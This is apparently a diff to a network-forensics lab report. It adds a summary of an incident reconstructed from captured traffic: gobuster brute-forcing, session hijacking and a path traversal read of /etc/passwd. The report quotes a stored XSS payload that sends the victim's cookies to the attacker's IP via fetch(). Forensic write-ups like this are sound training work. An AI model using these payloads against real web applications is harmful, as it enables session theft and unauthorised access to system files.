@@ -8,7 +8,10 @@ Your mission is to investigate the captured network traffic to determine the nat
 - **Tools**: Wireshark
 
 ## Overview
-(Conclude your report with a summary of the main finding of you analysis --> 5 Ws: Who, What, When, Where, Why)
+
+On March 29, 2024, a web application hosted at `73.124.17.52` (running Apache/2.4.52 on Ubuntu) suffered a security breach resulting in session hijacking and data exfiltration. At `11:52`, an initial unauthorized request originated from IP `135.143.142.5` attempting to access the admin panel using default credentials (`admin:password123`), which failed. At `12:01`, the attacker operating from IP `111.224.180.128` performed directory brute-forcing using `gobuster/3.6` to discover hidden paths and endpoints.
+
+Between `12:01` and `12:08`, the attacker injected a Stored Cross-Site Scripting (XSS) payload (`<script>fetch('http://111.224.180.128/' + document.cookie);</script>`) into `/reviews.php`. At `12:09`, an administrative user visiting from IP `135.143.142.5` accessed `/reviews.php`, triggering the script and exfiltrating their session token (`PHPSESSID=lqkctf24s9h9lg67teu8uevn3q`) to the attacker. Using this stolen token, the attacker hijacked the admin session to log into the system. Between `12:11` and `12:12`, the attacker accessed `log_viewer.php` and executed a Path Traversal attack using `../../../../../etc/passwd` to view sensitive system files before network recording ended at `12:31:05`.
 
 # Analysis
 
